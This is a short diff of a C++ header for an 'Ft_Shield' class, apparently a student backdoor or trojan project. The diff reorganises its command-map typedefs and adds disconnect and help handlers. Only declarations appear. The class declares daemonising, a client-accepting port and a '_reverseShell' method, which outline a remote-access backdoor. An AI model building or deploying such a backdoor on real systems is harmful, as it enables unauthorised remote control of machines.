@@ -23,9 +23,6 @@
 class Ft_Shield
 {
 	public:
-	/*---------- Public typedef --------------------*/
-		typedef void (Ft_Shield::*t_fptr)(int);
-		typedef std::map<std::string, t_fptr> t_commands;
 	/*---------- Constructors ----------------------*/
 					Ft_Shield(void);
 					Ft_Shield(const Ft_Shield & shield);
@@ -38,6 +35,13 @@ class Ft_Shield
 		void		daemonize(void);
 
 	private:
+	/*---------- Private typedef -------------------*/
+	/*
+	 * Create a std::map associating std::string with pointer function member
+	 * to easily add functionnality
+	 */
+		typedef void (Ft_Shield::*t_fptr)(int);
+		typedef std::map<std::string, t_fptr> t_commands;
 	/*---------- Private attributes ----------------*/
 		const int		_port;
 		const int		_MaxClients;
@@ -58,6 +62,8 @@ class Ft_Shield
 		void		_exit(void);
 		void		_shutdown(int fd);
 		void		_reverseShell(int fd);
+		void		_disconnect(int fd);
+		void		_help(int fd);
 };
 
 #endif /* FT_SHIELD_HPP */
